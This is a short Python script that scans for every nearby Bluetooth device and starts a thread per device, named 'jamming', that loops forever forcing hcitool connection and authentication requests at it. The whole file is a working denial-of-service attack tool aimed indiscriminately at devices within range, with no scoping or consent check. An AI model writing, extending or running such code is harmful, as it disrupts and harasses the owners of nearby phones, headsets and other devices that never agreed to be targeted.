import time
import os
import threading
import scanner  


def jamming(i, mac, name):
	print(f"Thread {i} working with device {mac}, {name}")
	while 1:
		conn = os.popen('hcitool cc --role=m ' + mac).read()
		auth = os.popen('hcitool auth ' + mac)
		time.sleep(2)



sc = scanner.Scanner()
sc.scanBT()
i=0
threads = []
for device in sc.bt:
	thread = threading.Thread(target=jamming, args=(i, device, sc.bt[device]))
	i+=1
	threads.append(thread)
	thread.start()

''' 
#para hacer join de los threads
for index, thread in enumerate(threads):
        logging.info("Main    : before joining thread %d.", index)
        thread.join()
        logging.info("Main    : thread %d done", index)
'''

